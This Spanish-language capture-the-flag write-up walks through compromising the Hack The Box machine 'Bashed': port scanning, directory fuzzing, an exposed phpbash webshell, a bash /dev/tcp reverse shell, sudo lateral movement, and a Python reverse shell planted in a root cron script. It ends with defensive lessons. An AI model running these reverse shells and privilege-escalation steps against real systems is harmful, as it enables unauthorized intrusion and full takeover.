# 🗂️ Writeup HTB — Bashed

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.13.209
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración activa, lanzamos un ping para verificar conectividad con la máquina objetivo. El valor del **TTL** nos permite intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```bash
> ping -c 1 10.129.13.209
> ```
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.13.209` — **IP objetivo** a la que se lanza el ping.

![](assets/Bashed-img-04-04-2026.png)

Obtenemos respuesta con un TTL de **63**, lo que confirma que estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos con la enumeración de puertos.

---

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

Comenzamos identificando qué puertos se encuentran abiertos sobre el rango completo de los 65535 posibles mediante un SYN Scan, que envía paquetes SYN sin completar el three-way handshake TCP — más rápido y menos ruidoso que un TCP Connect Scan completo.

> [!tip] Escaneo de puertos completo y sigiloso
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.13.209 -vvv -oN ports
> ```
> `-sS` — **SYN Scan** (half-open). Envía SYN, recibe SYN-ACK si el puerto está abierto o RST si está cerrado, sin completar nunca el handshake. Requiere privilegios de root.
> `-p-` — Escanea los **65535 puertos** posibles, desde el 1 hasta el 65535.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando los cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo** para acelerar el escaneo.
> `-n` — Sin resolución DNS — evita latencia adicional y ruido en la red.
> `-Pn` — Sin ping previo — asume el host activo aunque ICMP esté bloqueado.
> `10.129.13.209` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose** — muestra los puertos abiertos en tiempo real sin esperar al final.
> `-oN ports` — Guarda el output en formato legible en el archivo `ports`.

![](assets/Bashed-img-04-04-2026-6.png)

El escaneo revela **un único puerto abierto**: `80` (HTTP).

---

#### 🔬 Enumeración de versiones y servicios

Con el puerto identificado, lanzamos un segundo escaneo apuntando únicamente al puerto `80` para determinar qué servicio y versión exacta corre en él, ejecutando los scripts NSE por defecto para obtener información adicional.

> [!tip] Detección de versiones y scripts sobre el puerto 80
> ```bash
> nmap -sC -sV -p80 --min-rate 5000 -n -Pn -vvv 10.129.13.209 -oN version
> ```
> `-sC` — Lanza los **scripts por defecto** del motor NSE (Nmap Scripting Engine). Incluye detección de banners, enumeración básica de servicios y comprobaciones de configuraciones inseguras.
> `-sV` — **Detección de versiones** — envía probes adicionales para identificar el software exacto y su versión en el puerto.
> `-p80` — Escanea **únicamente el puerto 80**, el descubierto en el paso anterior.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — **Triple verbose**.
> `10.129.13.209` — **IP objetivo**.
> `-oN version` — Guarda el output en el archivo `version`.

![](assets/Bashed-img-04-04-2026-7.png)

---

### 🌐 Enumeración del servicio web — Puerto 80

Al acceder a `http://10.129.13.209` encontramos un blog construido sobre plantillas de Colorlib. El contenido en sí es genérico, pero hay un post que llama la atención inmediatamente: una entrada sobre **phpbash**, una herramienta de shell interactiva basada en web. El post indica explícitamente que phpbash fue desarrollada y probada en este mismo servidor — lo que significa que muy probablemente el archivo `phpbash.php` sigue presente en algún directorio del servidor.

![](assets/Bashed-img-04-04-2026-2.png)

Accediendo al post obtenemos más detalles sobre la herramienta:

![](assets/Bashed-img-04-04-2026-3.png)

Con esta información en mano, el siguiente paso natural es hacer fuzzing para localizar el archivo en el servidor.

---

#### 🌐 Fuzzing Web — Puerto 80

Con el puerto 80 activo y la pista del post sobre phpbash, procedemos a realizar fuzzing de directorios y archivos para localizar la herramienta y mapear toda la superficie web expuesta. El objetivo es descubrir rutas ocultas, paneles de administración, archivos de configuración o cualquier recurso no enlazado directamente desde la página principal. Lanzamos gobuster con una wordlist de tamaño medio y extensiones relevantes para maximizar la cobertura:

> [!tip] Fuzzing de directorios y archivos sobre el puerto 80
> ```bash
> gobuster dir -u http://10.129.13.209 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --no-error -x php,htm,html,csv,txt,xml --add-slash -t 40
> ```
> `dir` — Modo de fuerza bruta de directorios y archivos en un servidor web.
> `-u http://10.129.13.209` — URL objetivo del escaneo.
> `-w .../DirBuster-2007_directory-list-2.3-medium.txt` — Wordlist en su variante medium para una búsqueda exhaustiva sin ser excesivamente lenta.
> `--no-error` — No muestra errores en el output, manteniendo la salida limpia.
> `-x php,htm,html,csv,txt,xml` — Añade extensiones de archivo a cada entrada de la wordlist, ampliando la superficie de búsqueda más allá de los directorios puros.
> `--add-slash` — Añade una barra final a cada petición, útil para forzar la detección de directorios que requieren trailing slash.
> `-t 40` — Lanza **40 hilos en paralelo** para acelerar el escaneo.

![](assets/Bashed-img-04-04-2026-4.png)

Gobuster descubre varios directorios. El más interesante es `/dev` — al acceder encontramos que tiene **directory listing habilitado**, lo que permite ver su contenido directamente desde el navegador. Dentro aparece el archivo `phpbash.php` que buscábamos. Accedemos a `http://10.129.13.209/dev/phpbash.php`:

![](assets/Bashed-img-04-04-2026-5.png)

Tenemos una **shell web interactiva** que nos permite ejecutar comandos en el servidor como el usuario `www-data`. Aprovechamos para leer el archivo `/etc/passwd` y enumerar los usuarios del sistema:

> [!tip] Leer el archivo passwd desde la webshell phpbash
> ```bash
> cat /etc/passwd
> ```

![](assets/Bashed-img-04-04-2026-12.png)

El archivo revela **dos usuarios con shell válida**: `arrexel` y `scriptmanager`. Con acceso a la webshell ya podemos navegar al home de `arrexel` y leer la flag de usuario en `/home/arrexel/user.txt`.

---

## 💥 Explotación

Al haber localizado la webshell `phpbash.php` durante el fuzzing, obtenemos ejecución de comandos directamente sin necesidad de explotar ninguna vulnerabilidad adicional. Sin embargo, la webshell de phpbash tiene limitaciones — no es una shell completamente interactiva y carece de funcionalidades como job control o TTY. Para trabajar con mayor comodidad, convertimos este acceso en una reverse shell completa.

El directorio `/uploads` del servidor es escribible por `www-data`, por lo que subimos una webshell PHP adicional. Levantamos un servidor HTTP en nuestra máquina Kali para servirla:

> [!tip] Levantar servidor HTTP en Kali para servir la webshell
> ```bash
> python3 -m http.server 8080
> ```

Desde la webshell phpbash descargamos el archivo al directorio uploads:

> [!tip] Descargar la webshell al servidor desde phpbash
> ```bash
> wget http://10.10.16.8:8080/shell.php -O /var/www/html/uploads/shell.php
> ```

Con el archivo subido, nos ponemos en escucha en Kali y ejecutamos la reverse shell a través de la URL:

> [!tip] Ejecutar la reverse shell a través de la webshell subida
> ```bash
> # En Kali — listener
> nc -lvnp 443
>
> # URL a ejecutar en el navegador
> http://10.129.13.209/uploads/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.8/443 0>%261"
> ```
> `bash -i` — Shell bash interactiva.
> `>%26 /dev/tcp/10.10.16.8/443` — Redirige stdout al socket TCP de Kali en el puerto 443. `%26` es la codificación URL del carácter `&`.
> `0>%261` — Redirige stdin al mismo socket. `%261` es la codificación URL de `&1`.

![](assets/Bashed-img-04-04-2026-11.png)

Obtenemos una reverse shell como `www-data`.

---

## 🔼 Escalada de Privilegios

### 🔄 Movimiento lateral a scriptmanager via sudo

Con acceso como `www-data`, el primer paso es verificar los permisos sudo del usuario actual:

> [!tip] Verificar permisos sudo de www-data
> ```bash
> sudo -l
> ```

![](assets/Bashed-img-04-04-2026-10.png)

El output revela una entrada crítica:
```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Esto significa que `www-data` puede ejecutar **cualquier comando** como el usuario `scriptmanager` sin necesidad de contraseña. Aprovechamos para convertirnos en `scriptmanager` directamente:

> [!tip] Movimiento lateral a scriptmanager usando sudo
> ```bash
> sudo -u scriptmanager bash -p
> ```
> `sudo -u scriptmanager` — Ejecuta el comando siguiente en el contexto del usuario `scriptmanager`.
> `bash -p` — Lanza bash en modo **privilegiado** — preserva el UID efectivo del usuario que lanzó el proceso, evitando que bash lo resetee al UID real.

![](assets/Bashed-img-04-04-2026-13.png)

Somos `scriptmanager`. Ahora buscamos qué recursos tiene este usuario bajo su control:

> [!tip] Buscar directorios y archivos propiedad de scriptmanager
> ```bash
> find / -user scriptmanager 2>/dev/null
> ```
> `find /` — Busca recursivamente desde la raíz del sistema.
> `-user scriptmanager` — Filtra únicamente los archivos y directorios cuyo propietario es `scriptmanager`.
> `2>/dev/null` — Silencia los errores de permisos al intentar acceder a directorios restringidos.

![](assets/Bashed-img-04-04-2026-14.png)

El resultado revela que `scriptmanager` es propietario del directorio `/scripts` en la raíz del sistema — una ubicación inusual que merece investigación inmediata.

---

### ⚡ Escalada a root via cron job + Python script

Dentro de `/scripts` encontramos dos archivos:

![](assets/Bashed-img-04-04-2026-15.png)

- `test.py` — Script Python propiedad de `scriptmanager`
- `test.txt` — Archivo de texto propiedad de **root**

El hecho de que `test.txt` sea propiedad de root pero `test.py` sea propiedad de `scriptmanager` es una señal inequívoca: existe un **cron job de root** que ejecuta `test.py` periódicamente. El script escribe en `test.txt`, y como root es quien lo ejecuta, el archivo resultante queda en propiedad de root.

Verificamos los cron jobs del sistema para confirmar:

> [!tip] Ver todos los cron jobs del sistema
> ```bash
> cat /etc/crontab
> ```

![](assets/Bashed-img-04-04-2026-9.png)

Confirmado — hay un cron job de root que ejecuta `test.py` periódicamente. Como somos `scriptmanager` y somos propietarios de `test.py`, podemos reescribir su contenido con cualquier código Python que queramos, y root lo ejecutará en el siguiente ciclo del cron.

Reemplazamos el contenido de `test.py` con una reverse shell Python que conectará de vuelta a nuestra máquina Kali:

> [!tip] Reescribir test.py con una reverse shell Python
> ```python
> import socket,subprocess,os
> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
> s.connect(("10.10.16.8",444))
> os.dup2(s.fileno(),0)
> os.dup2(s.fileno(),1)
> os.dup2(s.fileno(),2)
> p=subprocess.call(["/bin/sh","-i"])
> ```
> `socket.socket` — Crea un socket TCP.
> `s.connect(("10.10.16.8",444))` — Conecta al listener de Kali en el puerto 444.
> `os.dup2(s.fileno(),0/1/2)` — Redirige stdin, stdout y stderr al socket — así todos los inputs y outputs de la shell van por la conexión de red.
> `subprocess.call(["/bin/sh","-i"])` — Ejecuta una shell `/bin/sh` interactiva cuya entrada/salida está conectada al socket.

Nos ponemos en escucha en Kali en el puerto 444 y esperamos a que el cron job de root ejecute el script modificado:

> [!tip] Listener en Kali esperando la reverse shell de root
> ```bash
> nc -lvnp 444
> ```

![](assets/Bashed-img-04-04-2026-16.png)

El cron job se ejecuta y recibimos la reverse shell como **root**. La flag de root se encuentra en `/root/root.txt`.

---

## 📝 Lecciones Aprendidas

**El directory listing expone información crítica.** Tener directory listing habilitado en `/dev` permitió localizar `phpbash.php` directamente. En un servidor de producción, el directory listing debe estar deshabilitado en todos los directorios — cualquier archivo accidentalmente expuesto puede convertirse en un vector de compromiso.

**Las herramientas de desarrollo no deben dejarse en producción.** phpbash es una herramienta legítima para desarrollo y debugging, pero dejarla accesible en un servidor público equivale a dejar una shell abierta. Cualquier herramienta de administración o debugging debe eliminarse antes de desplegar un servidor en producción.

**sudo mal configurado es escalada inmediata.** Permitir que `www-data` ejecute cualquier comando como `scriptmanager` con NOPASSWD es un error de configuración grave. Los permisos sudo deben seguir el principio de mínimo privilegio — solo el comando específico que se necesita, nunca `ALL`.

**Los cron jobs de root que ejecutan archivos editables por otros usuarios son una escalada directa.** Si root ejecuta un script que puede ser modificado por un usuario sin privilegios, ese usuario puede ejecutar código arbitrario como root. Los scripts ejecutados por cron de root deben ser propiedad de root y no escribibles por ningún otro usuario.